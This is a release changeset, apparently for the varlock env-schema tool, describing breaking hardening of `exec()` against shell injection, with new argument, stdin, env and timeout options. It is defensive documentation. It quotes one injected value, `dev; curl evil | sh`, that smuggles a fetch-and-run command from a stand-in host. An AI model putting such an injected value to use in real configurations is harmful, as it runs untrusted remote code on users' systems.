---
varlock: major
"@env-spec/parser": patch
env-spec-language: patch
---

`exec()` hardening:
- **Breaking:** a shell command passed to `exec()` must now be fixed text. Interpolating a value into it (``exec(`./script ${APP_ENV}`)`` or `$(./script ${APP_ENV})`) or running a value as the command (`exec($CMD)`) is a schema error, since a value like `APP_ENV="dev; curl evil | sh"` was run as shell. The error suggests the rewrite.
- New array form: `exec(["./script", "--env", $APP_ENV])` runs the program directly with no shell, one argument per element.
- Values can also follow a shell command and be read as `"$1"`, `"$2"`...: ``exec(`my-cli get "$1" | jq -r .value`, $ITEM)``. The shell treats them as data, never as more commands. Not available on Windows.
- New options on both forms: `stdin=` (written to the command's stdin) and `env={...}` (extra environment for the command), so a secret can reach a CLI without going through argv where `ps` can read it; `cwd=` (relative to the env file); and `timeout=` (`"30s"`), which fails the item instead of hanging the load.
- A failing `exec()` now reports the command as written in the schema instead of with interpolated values filled in, so a secret passed as an argument no longer lands in error output.
